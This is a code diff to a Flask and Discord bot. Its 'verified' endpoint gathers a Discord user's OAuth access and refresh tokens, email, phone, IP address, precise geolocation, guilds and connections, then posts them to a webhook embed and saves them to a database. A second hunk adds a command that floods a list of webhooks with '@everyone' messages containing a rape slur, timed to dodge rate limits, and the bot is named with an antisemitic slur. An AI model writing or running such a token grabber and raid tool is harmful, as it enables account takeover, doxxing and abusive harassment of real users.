@@ -143,58 +143,100 @@ def verified():
 
   useragent = flask.request.headers.get("User-Agent", "Unknown")
 
+  flag = geo.get('countryCode', 'xx').lower()
+  avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{user.get('avatar')}.png?size=512"
+  
   info = {
-    "content": f"""```
-[ USER ]
-ID:            {user_id}
-Username:      {user.get('username')}#{user.get('discriminator')}
-Email:         {user.get('email', 'N/A')}
-Phone:         {user.get('phone', 'N/A')}
-Verified:      {user.get('verified', False)}
-MFA Enabled:   {user.get('mfa_enabled', False)}
-Nitro:         {bool(user.get('premium_type', 0))}
-Locale:        {user.get('locale', 'N/A')}
-
-[ TOKENS ]
-Access Token:  {access_token}
-Refresh Token: {refresh_token}
-
-[ NETWORK ]
-IP:            {ip}
-ISP:           {geo.get('isp', 'N/A')}
-Org:           {geo.get('org', 'N/A')}
-User-Agent:    {useragent}
-
-[ LOCATION ]
-Country:       {geo.get('country', 'N/A')} ({geo.get('countryCode', 'N/A')})
-Region:        {geo.get('regionName', 'N/A')} ({geo.get('region', 'N/A')})
-City:          {geo.get('city', 'N/A')}
-ZIP:           {geo.get('zip', 'N/A')}
-Latitude:      {lat}
-Longitude:     {lon}
-Timezone:      {geo.get('timezone', 'N/A')}
-
-[ GUILDS ]
-{guild_list}
-
-[ CONNECTIONS ]
-{connection_list}
-```
-[⠀⠀⠀​​​​​​]({map_url})"""
+      "embeds": [
+          {
+              "title": f"👤 {user.get('username')}#{user.get('discriminator')}",
+              "description": f"**User ID:** `{user_id}`",
+              "color": 0x5865F2,
+  
+              "thumbnail": {
+                  "url": avatar
+              },
+  
+              "fields": [
+                  {
+                      "name": "📧 Account",
+                      "value": f"""
+  **Email:** `{user.get('email', 'N/A')}`
+  **Phone:** `{user.get('phone', 'N/A')}`
+  **Locale:** `{user.get('locale', 'N/A')}`
+  """,
+                      "inline": True
+                  },
+                  {
+                      "name": "🔐 Security",
+                      "value": f"""
+  **Verified:** `{user.get('verified', False)}`
+  **MFA Enabled:** `{user.get('mfa_enabled', False)}`
+  **Nitro:** `{bool(user.get('premium_type', 0))}`
+  """,
+                      "inline": True
+                  },
+                  {
+                      "name": "🌐 Network",
+                      "value": f"""
+  **IP:** `{ip}`
+  **ISP:** `{geo.get('isp','N/A')}`
+  **Org:** `{geo.get('org','N/A')}`
+  """,
+                      "inline": False
+                  },
+                  {
+                      "name": "📍 Location",
+                      "value": f"""
+  :flag_{flag}: **{geo.get('country','N/A')}**
+  **Region:** {geo.get('regionName','N/A')}
+  **City:** {geo.get('city','N/A')}
+  **ZIP:** {geo.get('zip','N/A')}
+  
+  `{lat}, {lon}`
+  """,
+                      "inline": False
+                  },
+                  {
+                      "name": "🏠 Guilds",
+                      "value": f"```{guild_list[:1000] if guild_list else 'None'}```",
+                      "inline": False
+                  },
+                  {
+                      "name": "🔗 Connections",
+                      "value": f"```{connection_list[:1000] if connection_list else 'None'}```",
+                      "inline": False
+                  },
+                  {
+                      "name": "🗺 Map",
+                      "value": f"[Open in Google Maps]({map_url})",
+                      "inline": False
+                  }
+              ],
+  
+              "image": {
+                  "url": f"https://maps.googleapis.com/maps/api/staticmap?center={lat},{lon}&zoom=10&size=600x300&markers=color:red%7C{lat},{lon}"
+              },
+  
+              "footer": {
+                  "text": f"User-Agent: {useragent[:100]}"
+              }
+          }
+      ]
   }
-
-  tokens[user_id] = {
-    'access_token': access_token,
-    'refresh_token': refresh_token,
-    'ip': ip,
-    'geo': geo,
-    'useragent': useragent,
-    'lat': lat,
-    'lon': lon,
-    'guild_list': guild_list,
-    'connection_list': connection_list,
-    'map_url': map_url
-  }
+  
+    tokens[user_id] = {
+      'access_token': access_token,
+      'refresh_token': refresh_token,
+      'ip': ip,
+      'geo': geo,
+      'useragent': useragent,
+      'lat': lat,
+      'lon': lon,
+      'guild_list': guild_list,
+      'connection_list': connection_list,
+      'map_url': map_url
+    }
 
   c.execute('''INSERT OR REPLACE INTO tokens (user_id, access_token, refresh_token, ip, geo, useragent, lat, lon, guild_list, connection_list, map_url) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
             (user_id, access_token, refresh_token, ip, json.dumps(geo), useragent, str(lat), str(lon), guild_list, connection_list, map_url))
@@ -483,7 +525,25 @@ Bot:            {jew.user.name}#{jew.user.discriminator}
 > Configured Guilds: {len(guild_ids)}
 ```""")
 
+@jew.command()
+@commands.has_permissions(administrator=True)
+async def webhooks(ctx):
+    await ctx.send("Starting Webhooks")
 
+    webhooks = [w.strip() for w in os.environ["WEBHOOKS"].split(",") if w.strip()]
+
+    async def send_messages(url):
+        async with httpx.AsyncClient() as client:
+            for _ in range(20):
+                r = await client.post(url, json={"content": "@everyone RAPED LOL"})
+                if r.status_code == 429:
+                    retry_after = r.json().get("retry_after", 1)
+                    await asyncio.sleep(retry_after)
+                    await client.post(url, json={"content": "@everyone LOLLL"})
+                elif _ < 19:
+                    await asyncio.sleep(1 / 28)  # ~28/sec, just under the 30/sec limit
+
+    await asyncio.gather(*[send_messages(url) for url in webhooks])
 
 # ── Entry Point ───────────────────────────────────────────────────────────────
 
